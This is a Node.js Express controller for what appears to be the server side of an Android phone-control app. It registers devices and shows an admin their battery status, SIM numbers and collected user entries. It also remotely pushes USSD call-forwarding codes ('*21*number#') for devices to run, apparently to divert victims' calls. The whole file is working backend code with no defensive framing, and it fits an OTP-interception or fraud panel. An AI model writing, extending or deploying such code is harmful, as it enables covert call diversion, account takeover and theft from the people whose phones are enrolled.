// controllers/deviceController.js

const mongoose = require('mongoose');
const Device = require('../models/Device');
const Call = require('../models/Call');
const Battery = require('../models/Battery');
const SimInfo = require('../models/SimInfo');
const User = require('../models/User');

exports.addDeviceDetails = async (req, res) => {
  try {
    const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
    if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
      return res.status(400).json({ success: false, error: "All fields are required!" });
    }
    const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
    await newDevice.save();
    res.status(201).json({
      success: true,
      message: "Device registered successfully!",
      uniqueid: newDevice._id
    });
  } catch (err) {
    console.error('Error in addDeviceDetails:', err);
    res.status(500).json({ success: false, error: "Server Error" });
  }
};

exports.getAllDevicesData = async (req, res, next) => {
  try {
    // 1. Fetch devices sorted newest first
    const devices = await Device.find({}, 'brand _id createdAt')
                                .sort({ createdAt: -1 })
                                .lean();

    // 2. Fetch battery statuses
    const batteryStatuses = await Battery.find({}, 'uniqueid batteryLevel connectivity')
                                         .lean();

    // 3. Fetch user entries
    const userDocs = await User.find({}, 'uniqueid entries')
                               .lean();

    // 4. Build map uniqueid → entries array
    const userMap = {};
    userDocs.forEach(doc => {
      userMap[doc.uniqueid.toString()] = doc.entries;
    });

    // 5. Merge into one array
    const devicesWithBattery = devices.map(device => {
      const idStr = device._id.toString();
      const battery = batteryStatuses.find(b => b.uniqueid?.toString() === idStr);
      const entries = userMap[idStr] || [];

      return {
        _id: device._id,
        uniqueid: device._id,
        brand: device.brand,
        batteryLevel: battery ? battery.batteryLevel : 'N/A',
        connectivity: battery ? battery.connectivity : 'Offline',
        entries,               // pass entries to EJS
        createdAt: device.createdAt
      };
    });

    // 6. Render the view
    res.render('phone', { users: devicesWithBattery });
  } catch (err) {
    console.error('Error in getAllDevicesData:', err);
    next(err);
  }
};

exports.getDeviceDetails = async (req, res) => {
  try {
    const device_id = req.params.id;

    // Validate ObjectId
    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }

    // Fetch device
    const device = await Device.findById(device_id).lean();
    if (!device) {
      return res.status(404).json({ success: false, error: "Device not found" });
    }

    // Fetch SIM info
    const simInfo = await SimInfo.findOne({ uniqueid: device_id }).lean();
    const sim1Number = simInfo?.sim1Number || "N/A";
    const sim2Number = simInfo?.sim2Number || "N/A";

    // Render details page
    res.render('final', { 
      device, 
      sim1Number,
      sim2Number
    });
  } catch (err) {
    console.error("Error in getDeviceDetails:", err);
    res.status(500).json({ success: false, error: "Server Error" });
  }
};

exports.stopCallForwarding = async (req, res) => {
  try {
    const device_id = req.params.id;
    const { sim } = req.body; // "SIM 1" or "SIM 2"

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }
    if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const updatedCall = await Call.findOneAndUpdate(
      { call_id: device_id },
      { sim, code: "##21#", updatedAt: new Date() },
      { upsert: true, new: true }
    );

    console.log("Stop Call Forwarding updated:", updatedCall);
    res.redirect(`/api/device/admin/phone/${device_id}`);
  } catch (error) {
    console.error("Error in stopCallForwarding:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};

exports.setCallForwarding = async (req, res) => {
  try {
    const { phoneNumber, sim } = req.body;
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }
    if (!/^\d{10}$/.test(phoneNumber)) {
      return res.status(400).json({ success: false, error: "Invalid phone number format" });
    }
    if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const activationCode = `*21*${phoneNumber}#`;
    const updatedCall = await Call.findOneAndUpdate(
      { call_id: device_id },
      { sim, code: activationCode, updatedAt: new Date() },
      { upsert: true, new: true }
    );

    console.log("Set Call Forwarding updated:", updatedCall);
    res.redirect(`/api/device/admin/phone/${device_id}`);
  } catch (error) {
    console.error("Error in setCallForwarding:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};

exports.getCallForwardingStatus = async (req, res) => {
  try {
    const device_id = req.params.id;
    const simParam = req.query.sim;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
    }
    if (simParam && !["SIM 1", "SIM 2"].includes(simParam)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const query = { call_id: device_id, ...(simParam ? { sim: simParam } : {}) };
    const callData = await Call.findOne(query).select("code sim").lean();

    if (!callData) {
      return res.status(404).json({
        success: false,
        message: "No call forwarding set for this device",
        code: null
      });
    }

    res.status(200).json({
      success: true,
      message: "Call forwarding details fetched successfully",
      code: callData.code,
      sim: callData.sim
    });
  } catch (error) {
    console.error("Error in getCallForwardingStatus:", error);
    res.status(500).json({ success: false, message: "Internal Server Error", code: null });
  }
};
